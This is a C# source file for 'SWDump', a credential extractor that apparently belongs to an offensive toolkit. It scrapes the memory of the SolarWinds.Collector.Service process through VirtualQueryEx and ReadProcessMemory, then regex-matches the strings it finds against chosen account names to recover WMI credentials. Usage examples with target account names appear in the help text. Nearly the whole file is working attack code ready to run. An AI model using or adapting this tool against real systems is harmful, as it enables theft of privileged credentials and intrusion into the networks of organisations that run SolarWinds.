using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

//https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processmodule.baseaddress?view=netframework-4.8
//https://www.pinvoke.net/default.aspx/kernel32.virtualqueryex
//http://www.exploit-monday.com/2012/03/powershell-live-memory-analysis-tools.html
//https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex?view=netframework-4.8
//https://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory

namespace SWDump
{
    public class ClCLI
    {
        public bool bVerbose = false;
        public bool bGetCreds = false;
        public bool bAccounts = false;
        public bool bContext = false;
        public int iContext = 2;
        public string sCliAccounts;
        public string[] saAccounts;
        public ClCLI()
        {
            string sCLI = @"
############################# Solarwinds Cred Extractor #############################
C# memory scraper that will hopefully dump WMI credentials used by Solarwinds

References:
http://www.exploit-monday.com/2012/03/powershell-live-memory-analysis-tools.html
https://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory
";
            Console.WriteLine(sCLI);
        }
        public bool FbCLIInterface(string[] args)
        {
            if (args.Length == 0)
            {
                return false;
            }
            for (int z = 0; z < args.Length; z++)
            {
                switch (args[z].ToLower())
                {
                    case "-verbose":
                        bVerbose = true;
                        break;
                    case "-getcreds":
                        bGetCreds = true;
                        break;
                    case "-accounts":
                        bAccounts = true;
                        sCliAccounts = args[z + 1].ToLower();
                        break;
                    case "-context":
                        bContext = true;
                        Int32.TryParse(args[z + 1], out iContext);
                        break;
                }
            }
            if (bGetCreds == true && bAccounts == true)
            {
                saAccounts = sCliAccounts.Split(',');
                Console.WriteLine("CLI: Attempting to dump credentials for the following accounts");
                foreach (string sAccount in saAccounts)
                {
                    Console.WriteLine(sAccount);
                }
                return true;
            }
            else
            {
                return false;
            }
        }
        public void FvPrintUsage()
        {
            string sUsage = @"
####################################  Usage  ########################################
Only -getcreds and -accounts switches are mandatory. Accounts are comma separated and
case insensitive. Context will provide that number of lines above and below the regex 
hit (default: 2).
#####################################################################################

Examples:
BADministration_SWDump.exe -getcreds -accounts ""administrator,cpl,cherrydarkness""
BADministration_SWDump.exe -getcreds -context 10 -accounts ""administrator""";
            Console.WriteLine(sUsage);            
        }
    }

    class Program
    {
        [DllImport("kernel32.dll")]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public AllocationProtectEnum AllocationProtect;
            public IntPtr RegionSize;
            public StateEnum State;
            public AllocationProtectEnum Protect;
            public TypeEnum Type;
        }
        public enum AllocationProtectEnum : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        public enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }
        public enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }

        public static ClCLI clCLI = new ClCLI();
        static void Main(string[] args)
        {
            try
            {
                //CLI Class
                if (!clCLI.FbCLIInterface(args))
                {
                    clCLI.FvPrintUsage();
                    return;
                }

                //Ensure the binary is compiled as x64. Code changes required for x86 servers running Solarwinds.
                if (IntPtr.Size != 8)
                {
                    Console.WriteLine("Main: x64 only.");
                    return;
                }
                
                //ProcessModule SWCModule;
                Process[] SWCProc = System.Diagnostics.Process.GetProcessesByName("SolarWinds.Collector.Service");
                MEMORY_BASIC_INFORMATION m = new MEMORY_BASIC_INFORMATION();

                //Get min and max address ranges for user applications. This with the memory sig check will narrow down
                //the search, hopefully saving time and memory.
                //Ref - https://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory
                SYSTEM_INFO sys_info = new SYSTEM_INFO();
                GetSystemInfo(out sys_info);
                IntPtr proc_min_address = sys_info.minimumApplicationAddress;
                IntPtr proc_max_address = sys_info.maximumApplicationAddress;
                long proc_min_address_l = (long)proc_min_address;
                long proc_max_address_l = (long)proc_max_address;

                if (SWCProc.Length == 0)
                {
                    Console.WriteLine("Main: Could not find SolarWinds.Collector.Service. Is it running?");
                    return;
                }
                if (SWCProc.Length > 1)                
                    Console.WriteLine("Main: Found more than one SolarWinds.Collector.Service running. Going to continue, troubleshoot if you'd get your credentials.");

                //Get base address of the SolarWinds.Collector.Service in memory
                //SWCModule = SWCProc[0].MainModule;
                //Max address if we miss our exit. I've only seen SolarWinds on x64 systems, this max will change on x86 to 0x7fffffff
                //long MaxAddress = 0x7ffffffe0000;

                //CurrentAddress will cycle through memory regions. We're looking for one specific region
                //long CurrentAddress = (long)SWCModule.BaseAddress;

                long CurrentAddress = proc_min_address_l;

                //lpBuffer will hold the value returned from ReadProcessMemory. We'll use this to hopefully identify our memory region of interest
                //This could be volatile and might change from version to version. You might be able to dump all of the SolarWinds memory but it's 300MB or larger.
                //At that point, maybe it's best using something like procdump + windbg ... I dunno.
                byte[] lpBuffer = new byte[1];
                int bytesread = 0;

                Console.WriteLine("Main: Starting memory cycle at {0}", CurrentAddress);

                //Cycle through memory regions starting at the base address of SolarWinds.Collector.Service.exe
                do
                {
                                        
                    int result = VirtualQueryEx(SWCProc[0].Handle, (IntPtr)CurrentAddress, out m, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                    
                    //Within the Collector.Service, we're looking for one specific region. In our test environment it ranged anywhere from 19Mb to 70Mb
                    //and included a "P" at base address + 40. Added 1GB catch so not to eat up large amounts of memory ... should be fine.
                    if ((ulong)m.RegionSize > 10000000 && (ulong)m.RegionSize < 1000000000) 
                    {
                        //Check signature - "P" in memory - region base address + 0x40
                        ReadProcessMemory(SWCProc[0].Handle, (IntPtr)CurrentAddress + 40, lpBuffer, 1, ref bytesread);
                        if (Encoding.Default.GetString(lpBuffer) == "P")
                        {
                            Console.WriteLine("Main: Memory region hit at {0}", m.BaseAddress);
                            Console.WriteLine("Main: Memory region size is {0}", m.RegionSize);
                           
                            //Read region into byte array. This might be insane; I'm sure there are better ways and would really
                            //like to know them.
                            byte[] bigbuffer = new byte[(ulong)m.RegionSize + 1];
                            ReadProcessMemory(SWCProc[0].Handle, m.BaseAddress, bigbuffer, (int)m.RegionSize, ref bytesread);
                            
                            //Regex statement thanks to Matt Graeber and his Memory-Tools.ps1
                            //http://www.exploit-monday.com/2012/03/powershell-live-memory-analysis-tools.html
                            System.Text.UnicodeEncoding Encoder = new System.Text.UnicodeEncoding();
                            Regex rxString = new Regex("[\u0020-\u007E]{6,}");
                            MatchCollection matches = rxString.Matches(Encoder.GetString(bigbuffer));                                                        

                            for (int i = 0; i < matches.Count; i++)
                            {                                
                                foreach (string sAccount in clCLI.saAccounts)
                                {
                                    if (matches[i].Value.ToString().IndexOf(sAccount, StringComparison.OrdinalIgnoreCase) >= 0)
                                    {
                                        for (int x = 0; x < clCLI.iContext; x++)
                                        {
                                            //Print the results and context
                                            Console.WriteLine("Main: {0} - {1}", i, matches[i].Value);
                                            Console.WriteLine("Main: {0} - {1}", i + x, matches[i + x].Value);
                                            Console.WriteLine("Main: {0} - {1}", i - x, matches[i - x].Value);
                                        }
                                    }
                                }
                            }                            
                        }
                    }                      
                    //Setting CurrentAddress to next region. Also checking our maxaddress range
                    if (CurrentAddress == (long)m.BaseAddress + (long)m.RegionSize)
                        break;
                    CurrentAddress = (long)m.BaseAddress + (long)m.RegionSize;                    
                } while (CurrentAddress <= proc_max_address_l);
            }
            catch
            { }
        }
    }
}

